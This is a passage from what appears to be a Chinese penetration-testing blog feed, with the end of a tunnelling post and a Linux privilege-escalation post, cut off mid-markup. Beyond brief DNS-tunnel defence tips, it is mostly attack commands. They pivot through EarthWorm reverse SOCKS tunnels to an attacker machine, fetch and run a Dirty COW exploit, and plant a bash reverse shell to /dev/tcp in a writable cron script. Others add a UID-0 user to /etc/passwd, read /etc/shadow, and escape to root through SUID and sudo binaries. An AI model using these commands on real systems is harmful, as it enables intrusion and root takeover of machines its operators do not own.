title="防御DNS隧道攻击的方法"></a>防御DNS隧道攻击的方法</h3><p>防御隧道攻击并非易事，特别是防御DNS隧道攻击。通过如下操作，能够防御常见的隧道攻击行为。</p><ul><li>禁止网络中的任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信。</li><li>虽然没有人会将TXT解析请求发送给DNS服务器，但是dnscat2和邮件服务器&#x2F;网关会这样做。因此，可以将邮件服务器&#x2F;网关列入白名单并阻止传入和传出流量中的TXT请求。</li><li>跟踪用户的DNS查询次数。如果达到阈值，就生成相应的报告。</li><li>阻止ICMP</li></ul><h1 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h1><p>常见的网络场景有如下三类。</p><ul><li>服务器在内网中，可以任意访问外部网络。</li><li>服务器在内网中，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接。</li><li>服务器在内网中，对外只开放了部分端口(例如80端口),且服务器不能访问外部网络。</li></ul><h2 id="常用的SOCKS代理工具"><a href="#常用的SOCKS代理工具" class="headerlink" title="常用的SOCKS代理工具"></a>常用的SOCKS代理工具</h2><p>SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。 SOCKS支持多种协议，包括HTTP、FTP等。SOCKS分为SOCKS 4和SOCKS 5两种类型：SOCKS 4只支持TCP协议；SOCKS 5不仅支持TCP&#x2F;UDP协议，还支持各种身份验证机制等,其标准端口为1080。SOCKS能够与目标内网计算机进行通信，避免多次使用端口转发。</p><p>SOCKS代理其实可理解为增强版的lcx。它在服务端监听一个服务端口，当有新的连接请求出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能。SOCKS代理工具有很多，在使用时要尽可能选择没有GUI界面的。此外，要尽量选择不需要安装其他依赖软件的SOCKS代理工具，能够支持多平台的工具更佳。</p><p>常用的SOCKS代理工具有：EarthWorm、reGeorg、sSocks、SocksCap64、Proxifier、ProxyChains</p><h2 id="SOCKS代理技术在网络环境中的应用"><a href="#SOCKS代理技术在网络环境中的应用" class="headerlink" title="SOCKS代理技术在网络环境中的应用"></a>SOCKS代理技术在网络环境中的应用</h2><h3 id="EarthWorm的应用"><a href="#EarthWorm的应用" class="headerlink" title="EarthWorm的应用"></a>EarthWorm的应用</h3><p>EW的使用也非常简单，共有六种命令格式，分别是ssocksd、rcsocks、 rssocks、 lcx_slave、lcx_listen、 lex_tran。 其中，用于普通网络环境的正向连接命令是ssocksd,用于反弹连接的命令是resocks、rssocks, 其他命令用于复杂网络环境的多级级联。</p><p>正向代理是指主动通过代理来访问目标机器，反向代理是指目标机器通过代理进行主动连接。</p><p>工具链接：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p><strong>测试环境：</strong><br><img src="/simg/tunnel_9.png" alt=" "></p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(win7)：192.168.220.143、192.168.52.10</li><li>内网主机(win2003)：192.168.52.20</li></ul><p>(1) 正向SOCKS 5服务器<br>以下命令适用于目标机器拥有一个外网IP地址的情况。<br><code>ew -s ssocksd -l 888</code><br>执行上述命令，即可架设一个端口为888的SOCKS代理。接下来，使用SocksCap64添加这个IP地址的代理即可。</p><p>(2) 反弹SOCKS 5服务器<br>目标机器没有公网IP地址的情况具体如下(使其可以访问内网资源)。<br>首先，将EW上传到kali攻击机中，执行如下命令。<br><code>ew -s rcsocks -l 1080 -e 888</code><br>该命令的意思是：在公网VPS上添加一个转接隧道，把1080端口收到的代理请求转发给888端口。然后，将EW上传到Web服务器中，执行如下命令。<br><code>ew -s rssocks -d 192.168.220.165 -e 888</code><br>该命令的意思是：在IP地址为192.168.220.143的服务器上启动SOCKS5服务，然后，反弹到192.168.220.165kail攻击机的888端口。<br><img src="/simg/tunnel_10.png" alt=" "></p><p>最后，可以在kali的命令行界面看到反弹成功。现在就可以通过访问192.168.220.165 kali攻击机的1080端口，使用在网络右侧IP地址为192.168.52.10的服务器上架设的SOCKS5代理服务了。</p><p>(3) 二级网络环境(a)</p><p><img src="/simg/tunnel_11.png" alt=" "></p><p>假设已经获得了A主机和B主机的控制权限。A主机配有两块网卡，一块能够连接外网，另一块(192.168.52.10)只能连接内网中的B主机，但无法访问内网中的其他资源。B主机可以访问内网资源，但无法访问外网。</p><p>首先，将EW上传到B主机中，利用ssocksd方式启动888端口的SOCKs代理，命令如下。<br><code>ew -s ssocksd -l 888</code></p><p>然后，将EW上传到A主机中，执行如下命令。<br><code>ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</code></p><p>该命令的意思是：将1080端口收到的代理请求转发给B主机的888端口。现在就可以通过访问A主机的外网1080端口使用在B主机上架设的SOCKS5代理了。</p><p>(4) 二级网络环境(b)<br><img src="/simg/tunnel_12.png" alt=" "><br>假设已经获得了A主机和B主机的控制权限。A主机既没有公网IP地址，也无法访向内网资源。B主机可以访问内网资源，但无法访问外网。</p><p>首先，将EW上传到kali攻击机中，把1080端口收到的代理请求转发给888端口，执行如下命令。<br><code>ew -s lcx_listen -l 10800 -e 888</code></p><p>该命令的意思是：在公网kali攻击机中添加转接隧道，将10800端口收到的代理请求转发给888端口。接着，将EW上传到B主机中，并利用ssocksd方式启动999端口的SOCKS代理，命令如下。<br><code>ew -s ssocksd -l 999</code></p><p>然后，将EW上传到A主机中，执行如下命令。<br><code>ew -s lcx_slave -d 192.168.220.165 -e 888 -f 192。168.52.10 -g 999</code></p><p>该命令的意思是：在A主机上利用lcx_slave方式，将攻击机的888端口和B主机的999端口连接起来。</p><p>(5) 三级网络环境<br><img src="/simg/tunnel_12.png" alt=" "><br>三级网络环境在渗透测试中比较少见，也比较复杂。测试环境为：右侧的内网A主机没有公网IP地址，但可以访问外网；B主机不能访问外网，但可以被A主机访问; C主机可被B主机访问，而且能够访问核心区域。</p><p>首先，将EW上传到kali攻击机中，把1080端口收到的代理请求转发给888端口，执行如下命令。<br><code>ew -s rcsocks -l 1080 -e 888 </code></p><p>在A主机上执行如下命令，将kali攻击机的888端口和B主机的999端口连接起来。<br><code>ew -s lcx_slave -d 192.168.220.165 -e 888 -f &lt;主机B IP地址&gt; -g 999</code></p><p>在B主机上执行如下命令，将999端口收到的代理请求转发给777端口。<br><code>ew -s lcx_listen -l 999 -e 777</code></p><p>在C主机上启动SOCKS5服务，并反弹到B主机的777端口上，命令如下。<br><code>ew -s rssocks -d &lt;主机B IP地址&gt; -e 777</code></p><p>现在就可以通过访问kali攻击机的1080 端口使用在C主机上架设的SOCKS 5代理了</p><h3 id="在Windows下使用SocksCap64实现内网漫游"><a href="#在Windows下使用SocksCap64实现内网漫游" class="headerlink" title="在Windows下使用SocksCap64实现内网漫游"></a>在Windows下使用SocksCap64实现内网漫游</h3><p>下载并安装SocksCap64, 以管理员权限打开程序。<br><img src="/simg/tunnel_14.png" alt=" "></p><p>SocksCap64的使用方法比较简单，单击“代理”按钮，添加一个代理，然后设置代理服务器：的IP地址和端口即可。设置完成后，可以单击界面上的闪电图标按钮，测试当前代理服务器是否可以连接。<br><img src="/simg/tunnel_15.png" alt=" "><br>选择浏览器，单击右键，在弹出的快捷菜单中单击“ 在代理隧道中运行选中程序”选项，就可以自由访问内网资源了。</p><h3 id="在Linux下使用ProxyChains实现内网漫游"><a href="#在Linux下使用ProxyChains实现内网漫游" class="headerlink" title="在Linux下使用ProxyChains实现内网漫游"></a>在Linux下使用ProxyChains实现内网漫游</h3><p>Kali Linux中预装了ProxyChains, 稍加配置就可以使用。打开终端，输入如下命令。<br><code>vi /etc/proxychains.conf</code></p><p>删除“dynamic_ chain” 前面的注释符“#”。来到窗口底部，把“127.0.0.1 9050”改成想要访问的端口的信息。<br><img src="/simg/tunnel_16.png" alt=" "></p><p>测试一下代理服务器是否能正常工作。在终端输入如下命令。<br><code>proxyresolv www.baidu.com</code></p><p>此时会显示“未找到命令”的提示信息。在终端输入如下命令。<br><code>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</code></p><p>再次测试代理服务器的工作是否正常。显示“OK”,表示代理服务器已经正常工作了。现在就可以访问内网了。先访问内网中的网站。在终端输入“proxychains firefox”命令，启动火狐浏览器。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/jiufang/p/16451976.html">内网渗透之隐藏通信隧道技术</a><br><a href="https://xz.aliyun.com/t/12498">网络隧道：突破内网的通行证</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;复习+学习。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="隧道通信" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Linux内网渗透之提权</title>
    <link href="http://example.com/2023/08/28/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83/"/>
    <id>http://example.com/2023/08/28/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83/</id>
    <published>2023-08-27T16:00:00.000Z</published>
    <updated>2023-08-29T11:50:45.775Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Linux提权方式的复习与学习。</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>我们在 Linux 中特权升级的最终目标是获得root用户。</p><h1 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h1><p>通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限，如在iis就是iis用户组权限，在apache就是apache权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息，ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限超级管理员权限。</p><p>注意：没有在必要的情况下，不建议使用，因为会把目标机器搞的宕机</p><p>Linux利用内核漏洞一般包括三个环节：</p><ol><li>对目标系统进行信息收集，获取系统内核信息和版本信息。<br>查看发行版本:<br><code>cat /etc/issue</code><br><code>cat /etc/*-release</code><br><code>cat /etc/redhat-release</code><br><code>cat /proc/version</code><br>lsb_release -a</li></ol><p>查看内核版本信息:<br><code>uname -a</code></p><ol start="2"><li>获取EXP。<br>方法一：<br>利用Kali自带的searchsploit来搜索对应版本的exp：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit &lt;发行版本内核版本&gt;</span><br><span class="line">searchsploit -t Ubuntu 16.04 // -t 仅搜索漏洞标题</span><br><span class="line">searchsploit -s Ubuntu 16.04</span><br><span class="line">searchsploit -s Linux Kernel 4.15.0</span><br></pre></td></tr></table></figure></li></ol><p>方法二：<br>官网，或其它网站查找</p><ol start="3"><li>复制到当前目录，上传编译赋权执行。<br>找到可利用的脚本之后，查看路径信息，并复制一个到当前目录（别损坏了漏洞库中原文件）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x linux/local/47169.c</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/47169.c ./</span><br></pre></td></tr></table></figure></li></ol><p>如果有其它webshell，有上传权限，那就把这个脚本拿出来，上传上去，再执行就好。</p><p>如果没有其它上传途径，可以在攻击方本地开一个http服务，让目标来下载也行：（开的服务默认在根目录起始）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http-server 80</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><p>之后将脚本放到根目录，然后让目标机来下载即可：<br><code>wget http://192.168.1.130/47196.c -O /tmp/47169.c</code><br>下载并保存到&#x2F;tmp目录下</p><p>编译，加权限，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc 47169.c -o exp</span><br><span class="line"><span class="built_in">chmod</span> +x exp</span><br><span class="line">./exp</span><br><span class="line"></span><br><span class="line">// <span class="built_in">id</span>测试是否提权成功</span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">Linux_Exploit_Suggester</a><br>很好用的一款提权辅助工具，用法很简单，在靶机上执行.&#x2F;linux-exploit-suggester.sh就会列出该靶机上可利用的漏洞编号.</p><h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>漏洞信息：CVE-2016-5195漏洞（Dirty COW，脏牛）<br>影响范围：Linux 内核2.6.22 – 3.9 (x86&#x2F;x64)<br>漏洞EXP：<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a><br>漏洞成因：<br>Linux写时拷贝技术（copy-on-write）<br>在Linux系统中，fork()会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，Linux系统中引入了“写时复制”技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。</p><p>首先，搜索发行版本和内核版本，确认在Dirty Cow影响范围内。<br>利用 <code>serachsploit linux 3.2.78</code> 搜索该版本漏洞。<br>可以找到几个赃牛漏洞脚本，这里示例为40839.c脚本</p><p>将该脚本下载&#x2F;上传到目标机下。</p><p>然后编译该脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br><span class="line"></span><br><span class="line">-pthread  在Linux中要用到多线程时，需要链接pthread库</span><br><span class="line">-o 40839  gcc生成的目标文件,名字为40839</span><br><span class="line">-lcrypt   添加需要的外部库</span><br></pre></td></tr></table></figure><p>添加可执行权限并执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./dirty</span><br><span class="line">./dirty 999999</span><br></pre></td></tr></table></figure><p>之后就可以直接用密码999999登录root权限账户firefart</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br><span class="line">999999</span><br></pre></td></tr></table></figure><p>在运行漏洞利用后恢复 &#x2F;etc&#x2F;passwd<br><code>mv /tmp/passwd.bak /etc/passwd</code></p><h1 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>定时任务(Cron job)是Linux系统中的一个守护进程，用于调度重复任务，通过控制crontab可以让系统周期性地执行某些命令或脚本。cron是Linux系统中最为实用的工具之一，但是也可能被黑客用于提权操作。由于cron通常以root特权运行，如果我们可以修改其调度的任何脚本或二进制文件，那么便可以使用root权限执行任意代码。<br>默认情况下，使用环境变量有限的&#x2F;bin&#x2F;shshell</p><p>Cron tables存储了Cron jobs的配置<br>User Crontabs通常位于&#x2F;var&#x2F;spool&#x2F;cron&#x2F;or&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;<br>system系统的crontab位于&#x2F;etc&#x2F;crontab</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><ol><li><p>运用如下命令列出计划任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /etc/cron*</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure></li><li><p>在服务器上查找overwrite.sh 文件：<br><code>locate overwrite.sh</code><br><code>/usr/local/bin/overwrite.sh</code></p></li><li><p>检查文件的权限<br><code>ls -l /usr/local/bin/overwrite.sh</code><br>注意：这个文件是可写的</p></li><li><p>将 overwrite.sh文件的内容替换为：<br><code>#!/bin/bash bash -i &gt;&amp; /dev/tcp/192.168.175.130/4444 0&gt;&amp;1</code></p></li><li><p>kali上运行nc<br>等待 cron jobs运行，返回root权限</p></li><li><p>定时任务创建<br>编写一个脚本test.py ，将其权限置为所有用户可读可写可操作： <code>chmod 777 test.py</code></p></li></ol><p>而后修改crontab文件，将定时任务注册到系统中：<code>vim /etc/crontab</code><br>在末尾加上 <code>*/1 *   * * *   root    python  /home/ubuntu/test.py</code><br>表示每1分钟运行一次test.py。<br>至此，定时任务创建成功。</p><ol start="3"><li>提权操作<br>假设通过之前的渗透操作，获得了低权限的用户ubuntu。<br>查看crontab文件： <code>cat /etc/crontab</code><br>发现存在定时任务，以root身份定时运行 <code>/home/ubuntu/test.py</code><br>而test.py文件是任意成员可写的，于是向其代码尾部追加以下内容：<br><code>os.chmod(“/etc/passwd”,stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)</code><br>将passwd文件权限设置为任意成员可写。</li></ol><p>一分钟之后，程序自动运行，发现passwd已经任意成员可写。</p><p>接下来需要做的就是构造一个用户，在密码占位符处指定密码，UID设置为0，并将其添加到 &#x2F;etc&#x2F;passwd 文件中。</p><p>首先，使用perl语言生成带有盐值的密码：<br><code>perl -le &#39;print crypt(&quot;hack&quot;,&quot;addedsalt&quot;)&#39;</code></p><p>而后，拼接密码，将以下字符串写入&#x2F;etc&#x2F;passwd文件，之后便拥有了一个超级用户hack：hack。<br><code>hack:adCP9//qaScc2:0:0:User_like_root:/root:/bin/bash</code></p><p>最后，登录hack用户，自动跳转到root用户，提权成功！</p><h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>SUID（Set UID, 设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。为可执行文件添加suid权限的目的是简化操作流程，让普通用户也能做一些高权限才能做的的工作。但是如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</p><p>SUID提权的原理与Linux进程的UID有关，进程在运行的时候有以下三个UID：</p><p>（A）Real UID：执行该进程的用户的UID。Real UID只用于标识用户，不用于权限检查。</p><p>（B）Effective UID（EUID）：进程执行时生效的UID。在对访问目标进行操作时，系统会检查EUID是否有权限。一般情况下，Real UID与EUID相同，但在运行设置了SUID权限的程序时，进程的EUID会被设置为程序文件属主的UID。</p><p>（C）Saved UID：在高权限用户降权后，保留的UID。</p><p>如果某个设置了SUID权限的程序运行后创建了shell，那么shell进程的EUID也会是这个程序文件属主的UID，如果属主为root，便是一个root shell。root shell中运行的程序的EUID也都是0，具备超级权限，于是便实现了提权。</p><p>1、SUID权限仅对二进制程序(binary program)有效；<br>2、执行者对于该程序需要具有执行(x)的可执行权限；<br>3、本权限仅在执行该程序的过程中有效(run-time)；<br>4、执行者将具有该程序拥有者(owner)的权限。</p><p>SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。</p><h2 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h2><p>通过以下命令，可找到具有SUID权限的参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三选一</span></span><br><span class="line"><span class="comment"># /表示从文件系统的顶部（根）开始并找到每个目录</span></span><br><span class="line"><span class="comment"># -perm 表示搜索随后的权限</span></span><br><span class="line"><span class="comment"># -u = s表示查找root用户拥有的文件</span></span><br><span class="line"><span class="comment"># -type表示我们正在寻找的文件类型</span></span><br><span class="line"><span class="comment"># f 表示常规文件，而不是目录或特殊文件</span></span><br><span class="line"><span class="comment"># 2表示该进程的第二个文件描述符，即stderr（标准错误）</span></span><br></pre></td></tr></table></figure><p>SUID设置方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s &lt;filename&gt;</span><br><span class="line"><span class="built_in">chmod</span> u-s &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>常见SUID提权文件有：<br>nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</p><ol><li>nmap<br>旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令。由于 Nmap 位于以 root 权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。</li></ol><p><code>nmap --interactive  # 启动交互模式</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>或者有一个 Metasploit 模块，它通过 SUID Nmap 二进制文件执行权限提升。<br><code>exploit/unix/local/setuid_nmap</code></p><ol start="2"><li>find<br>实用程序find可用于发现存储在系统上。然而，它是执行命令的能力。因此，如果它被配置为使用 SUID 权限运行，那么所有将通过 find 执行的命令都将以 root 身份执行。</li></ol><p>非root权限下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> abc</span><br><span class="line">find abc -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"></span><br><span class="line">find . -<span class="built_in">exec</span> /bin/sh -p \; -quit <span class="comment"># 输入命令，返回shell</span></span><br></pre></td></tr></table></figure><ol start="3"><li>vim<br>Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。</li></ol><p><code>vim.tiny /etc/shadow</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 还可以通过vim来打开shell</span></span><br><span class="line"></span><br><span class="line">vim.tiny</span><br><span class="line"></span><br><span class="line"><span class="comment"># Press ESC key</span></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><ol start="4"><li><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p <span class="comment"># 进入bash命令交互模式</span></span><br><span class="line">bash-3.2<span class="comment"># id # 以root权限执行id</span></span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) <span class="built_in">groups</span>=1002(service)<span class="comment"># 结果</span></span><br></pre></td></tr></table></figure></li><li><p>less &amp; more</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure></li><li><p>make</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COMMAND=<span class="string">&#x27;/bin/sh -p&#x27;</span></span><br><span class="line">make -s -<span class="built_in">eval</span>=$<span class="string">&#x27;x:\n\t-&#x27;</span><span class="string">&quot;<span class="variable">$COMMAND</span>&quot;</span> <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>flock</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flock -u / /bin/sh -p <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>env</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> /bin/sh -p <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import os; os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)&#x27;</span>  <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="Sudo滥用提权"><a href="#Sudo滥用提权" class="headerlink" title="Sudo滥用提权"></a>Sudo滥用提权</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>sudo 是一个程序，允许用户运行具有其他用户安全特权的其他程序。</p><p>默认情况下，该其他用户将是root用户<br>用户通常需要输入密码才能使用sudo，并且必须允许用户通过&#x2F;etc&#x2F;sudoersfile文件中的规则访问。<br>规则可用于将用户限制在某些程序中，并放弃密码输入要求。<br>在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在&#x2F;etc&#x2F;sudoers自定义），使用sudo不需要再次输入密码。</p><h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo &lt;program&gt;  <span class="comment"># 使用sudo运行程序</span></span><br><span class="line">sudo -u &lt;username&gt; &lt;program&gt; <span class="comment"># 以特定用户的身份运行程序</span></span><br><span class="line">sudo -l <span class="comment"># 允许（且不允许）运行列出用户的程序</span></span><br><span class="line">sudo su <span class="comment"># 通过使用交换用户su命令生成root</span></span><br><span class="line">sudo -s sudo -i sudo /bin/bash sudo passwd <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>在sudoers中增加以下内容，可以使用户user_test可以从任何终端运行，以root用户身份运行命令find 而无需密码。</p><p><code>user_test  ALL = (root) NOPASSWD: /usr/bin/find</code></p><p>可以利用sudo提权的命令如下：<br><code>wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp</code></p><h3 id="权限配置"><a href="#权限配置" class="headerlink" title="权限配置"></a>权限配置</h3><p>新建普通用户sudo_test，而后切换到root用户，执行以下动作：</p><p>添加文件的写权限： <code>chmod u+w /etc/sudoers</code></p><p>向sudoer文件中添加以下内容（可按需增加）：<br><code>sudo_test   ALL= (root) NOPASSWD: /usr/bin/find, (root) NOPASSWD: /usr/bin/vim,(root) NOPASSWD:/usr/bin/awk,(root) NOPASSWD:/usr/bin/man,(root) NOPASSWD:/usr/bin/less,(root) NOPASSWD:/bin/more,(root) NOPASSWD:/bin/tar,(root) NOPASSWD:/usr/bin/zip</code></p><p>撤销文件的写权限： <code>chmod u-w /etc/sudoers</code></p><h3 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h3><p>当前已经获取到低权限用户sudo_test，使用 <code>sudo -l</code> 命令查看本用户允许使用的sudo程序。</p><p><img src="/simg/Linux_Privilege_Escalation_2.png" alt=" "></p><ol><li><p>find</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /etc/passwd -<span class="built_in">exec</span> /bin/sh \ <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>vim</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -c <span class="string">&#x27;!sh&#x27;</span> <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>awk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span> <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>less</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line">!</span><br><span class="line">(Enter) <span 